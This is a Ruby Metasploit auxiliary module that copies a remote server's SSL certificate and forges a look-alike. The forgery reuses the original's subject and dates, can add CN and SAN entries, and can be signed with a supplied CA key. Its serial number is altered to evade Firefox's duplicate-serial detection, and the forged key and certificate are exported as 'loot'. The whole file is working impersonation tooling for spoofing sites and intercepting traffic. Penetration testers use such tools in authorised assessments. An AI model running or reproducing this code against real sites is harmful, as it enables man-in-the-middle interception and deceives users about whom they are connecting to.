##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Rex::Socket::SslTcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'HTTP SSL Certificate Impersonation',
        'Author' => 'Chris John Riley',
        'References' => [
          ['URL', 'https://www.slideshare.net/ChrisJohnRiley/ssl-certificate-impersonation-for-shits-andgiggles']
        ],
        'License' => MSF_LICENSE,
        'Description' => %q{
          This module request a copy of the remote SSL certificate and creates a local
          (self.signed) version using the information from the remote version. The module
          then Outputs (PEM|DER) format private key / certificate and a combined version
          for use in Apache or other Metasploit modules requiring SSLCert Inputs for private
          key / CA cert have been provided for those with DigiNotar certs hanging about!
        },
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('SSLServerNameIndication', [ false, 'SSL/TLS Server Name Indication (SNI)', nil], aliases: ['SNI']),
        OptEnum.new('OUT_FORMAT', [true, 'Output format', 'PEM', ['DER', 'PEM']]),
        OptString.new('EXPIRATION', [false, 'Date the new cert should expire (e.g. 06 May 2012, YESTERDAY or NOW)', nil]),
        OptPath.new('PRIVKEY', [false, 'Sign the cert with your own CA private key', nil]),
        OptString.new('PRIVKEY_PASSWORD', [false, 'Password for private key specified in PRIV_KEY (if applicable)', nil]),
        OptPath.new('CA_CERT', [false, 'CA Public certificate', nil]),
        OptString.new('ADD_CN', [false, 'Add CN to match spoofed site name (e.g. *.example.com)', nil]),
        OptString.new('ADD_SAN', [false, 'Add SAN entries to certificate (e.g. alt.example.com,127.0.0.1)', nil])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('AlterSerial', [false, 'Alter the serial number slightly to avoid FireFox serial matching', true])
      ]
    )
  end

  def get_cert(rhost, rport, sni)
    info_hash = { 'PeerHost' => sni, 'PeerAddr' => rhost, 'PeerPort' => rport.to_s }
    sslSocket = Rex::Socket::SslTcp.create(info_hash)
    cert = sslSocket.peer_cert
    sslSocket.close
    cert
  end

  def run
    if !datastore['SSLServerNameIndication'].nil?
      sni = datastore['SSLServerNameIndication']
      print_status("Connecting to #{rhost}:#{rport} SNI:#{sni}")
    else
      sni = false
      print_status("Connecting to #{rhost}:#{rport}")
    end

    if !datastore['PRIVKEY'].nil? && !datastore['CA_CERT'].nil?
      print_status('Signing generated certificate with provided PRIVATE KEY and CA Certificate')
      if !datastore['PRIVKEY_PASSWORD'].nil? && !datastore['PRIVKEY_PASSWORD'].empty?
        ca_key = OpenSSL::PKey::RSA.new(File.read(datastore['PRIVKEY']), datastore['PRIVKEY_PASSWORD'])
      else
        ca_key = OpenSSL::PKey::RSA.new(File.read(datastore['PRIVKEY']))
      end
      ca = OpenSSL::X509::Certificate.new(File.read(datastore['CA_CERT']))
    elsif !datastore['PRIVKEY'].nil? || !datastore['CA_CERT'].nil?
      # error if both PRIVKEY and CA_CERT are not BOTH provided
      print_error('CA Certificate AND Private Key must be provided!')
      return
    end

    begin
      cert = get_cert(rhost, rport, sni)
      disconnect
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE => e
      print_error(e.message)
    end

    if !cert
      print_error("#{rhost}:#{rport} No certificate subject or CN found")
      return
    end

    print_status("Copying certificate from #{rhost}:#{rport}\n#{cert.subject} ")
    vprint_status("Original Certificate Details\n\n#{cert.to_text}")

    begin
      keylength = /Key: \((\d+)/i.match(cert.signature_algorithm)[1] # Grab keylength from target cert
    rescue StandardError
      keylength = 1024
    end

    begin
      hashtype = /Algorithm: (\w+)With/i.match(cert.to_text)[1] # Grab hashtype from target cert
    rescue StandardError
      hashtype = 'sha1'
    end

    new_cert = OpenSSL::X509::Certificate.new
    ef = OpenSSL::X509::ExtensionFactory.new

    # Duplicate information from the remote certificate
    entries = ['version', 'serial', 'subject', 'not_before', 'not_after']
    entries.each do |ent|
      new_cert.send("#{ent}=", cert.send(ent))
    end

    # add additional Common Name to the new cert
    if !datastore['ADD_CN'].nil? && !datastore['ADD_CN'].empty?
      new_cert.subject = OpenSSL::X509::Name.new(new_cert.subject.to_a << ['CN', datastore['ADD_CN'].to_s])
      print_status("Adding #{datastore['ADD_CN']} to the end of the certificate subject")
      vprint_status("Certificate Subject: #{new_cert.subject}")
    end

    if !datastore['EXPIRATION'].nil? && !datastore['EXPIRATION'].empty?
      # alter the not_after and not_before dates
      print_status("Altering certificate expiry information to #{datastore['EXPIRATION']}")

      case datastore['EXPIRATION'].downcase
      when 'yesterday'
        new_cert.not_after = 24.hours.ago
        new_cert.not_before = 1.year.ago - 24.hours # set start date (1 year cert)
      when 'now'
        new_cert.not_after = Time.now
        new_cert.not_before = 1.year.ago # set start date (1 year cert)
      else
        new_cert.not_after = Time.parse(datastore['EXPIRATION'])
        new_cert.not_before = Time.parse(datastore['EXPIRATION']) - 1.year # set start date (1 year cert)
      end
      vprint_status("Certificate expiry date set to #{new_cert.not_after}")
    end

    # Alter serial to avoid duplicate issuer/serial detection
    if datastore['AlterSerial']
      if (cert.serial.to_s.length > 1)
        # alter last digits of the serial number
        new_cert.serial = (cert.serial.to_s[0..-2] + rand(0xFF).to_s).to_i
      else
        # serial is too small, create random serial
        vprint_error('The serial number of the original cert is too short. Creating new random serial')
        new_cert.serial = rand(0xFFFF)
      end
    else
      # match serial number
      new_cert.serial = cert.serial.to_s
    end

    if !datastore['PRIVKEY'].nil? && !datastore['PRIVKEY'].empty?
      new_cert.public_key = ca_key.public_key
      ef.subject_certificate = ca
      ef.issuer_certificate = ca
      new_cert.issuer = ca.subject
      print_status("Using private key #{datastore['PRIVKEY']}")
    else
      new_key = OpenSSL::PKey::RSA.new(keylength.to_i)
      new_cert.public_key = new_key.public_key
      ef.subject_certificate = new_cert
      ef.issuer_certificate = new_cert
      if !datastore['ADD_CN'].nil? && !datastore['ADD_CN'].empty?
        new_cert.issuer = new_cert.subject
      else
        new_cert.issuer = cert.subject
      end
    end

    new_cert.extensions = [
      ef.create_extension('basicConstraints', 'CA:FALSE', true),
      ef.create_extension('subjectKeyIdentifier', 'hash'),
    ]

    # Add additional SAN entries to the new cert. See https://support.f5.com/csp/article/K13471
    # for an example of how this added SAN field is expected to look like in a certificate.
    if !datastore['ADD_SAN'].nil? && !datastore['ADD_SAN'].empty?
      sans = datastore['ADD_SAN'].to_s.split(/,/)
      sans.map! do |san|
        san = (san =~ Resolv::IPv4::Regex || san =~ Resolv::IPv6::Regex) ? "IP:#{san}" : "DNS:#{san}"
      end
      new_cert.add_extension(ef.create_extension('subjectAltName', sans.join(','), false))
      print_status("Adding #{datastore['ADD_SAN']} to the certificate subject alternative names")
    end

    if !datastore['PRIVKEY'].nil? && !datastore['PRIVKEY'].empty?
      new_cert.sign(ca_key, OpenSSL::Digest.new(hashtype))
      new_key = ca_key # Set for file output
    else
      new_cert.sign(new_key, OpenSSL::Digest.new(hashtype))
    end

    vprint_status("Duplicate Certificate Details\n\n#{new_cert.to_text}")
    print_status('Beginning export of certificate files')

    priv_key = new_key.send("to_#{datastore['OUT_FORMAT'].downcase}")
    cert_crt = new_cert.send("to_#{datastore['OUT_FORMAT'].downcase}")
    combined = new_key.send('to_pem') + new_cert.send('to_pem')

    addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB

    print_status("Creating looted key/crt/pem files for #{rhost}:#{rport}")

    p = store_loot("#{datastore['RHOST'].downcase}_key", datastore['OUT_FORMAT'].downcase, addr, priv_key, 'imp_ssl.key', 'Impersonate_SSL')
    print_good("key: #{p}")

    p = store_loot("#{datastore['RHOST'].downcase}_cert", datastore['OUT_FORMAT'].downcase, addr, cert_crt, 'imp_ssl.crt', 'Impersonate_SSL')
    print_good("crt: #{p}")

    p = store_loot("#{datastore['RHOST'].downcase}_pem", 'pem', addr, combined, 'imp_ssl.pem', 'Impersonate_SSL')
    print_good("pem: #{p}")
  end
end
